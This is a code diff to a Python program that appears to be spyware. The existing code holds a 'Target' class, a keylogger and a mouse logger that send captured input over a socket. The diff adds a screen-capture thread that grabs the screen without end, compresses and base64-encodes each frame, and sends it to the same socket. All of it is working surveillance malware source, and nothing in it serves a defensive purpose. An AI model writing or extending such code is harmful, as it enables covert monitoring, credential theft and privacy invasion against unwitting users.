@@ -5,8 +5,12 @@ from datetime import datetime
 from pynput.keyboard import Listener
 from pynput import mouse
 import json
+from zlib import compress
+from mss import mss
+import base64
 
-
+WIDTH = 1900
+HEIGHT = 1000
 
 
 class Target():
@@ -24,12 +28,19 @@ class Main():
                              args=()).start()
         threading.Thread(target=self.mouse_logger,
                              args=()).start()
+        threading.Thread(target=self.screen_caprure,
+                             args=()).start()
+        
 
     def keylogger(self):
         Keylogger(self.client_socket)
         
     def mouse_logger(self):
         Mouse_Logger(self.client_socket)
+        
+    def screen_caprure(self):
+        screen = Screen_Capture(self.client_socket)
+        screen.capturing()
 
 class Keylogger():
     def __init__(self, client_socket):
@@ -89,6 +100,29 @@ class Mouse_Logger():
             message_to_send = json.dumps(message)
             SuperSocket(self.client_socket).send_msg((message_to_send).encode())
 
+class Screen_Capture():
+    def __init__(self, client_socket):
+        self.client_socket = client_socket
+    
+    def capturing(self):
+        with mss() as sct:
+        # The region to capture
+            rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
+
+            while True:
+                # Capture the screen
+                img = sct.grab(rect)
+                # Tweak the compression level here (0-9)
+                pixels = compress(img.rgb, 6)
+                encoded_image = base64.b64encode(pixels).decode('utf-8')
+                # Send pixels
+                message = {
+                    "type": "screen",
+                    "data": encoded_image
+                }
+                message_to_send = json.dumps(message)
+                SuperSocket(self.client_socket).send_msg((message_to_send).encode())
+                
 class SuperSocket():
     def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
         self.current_socket = current_socket
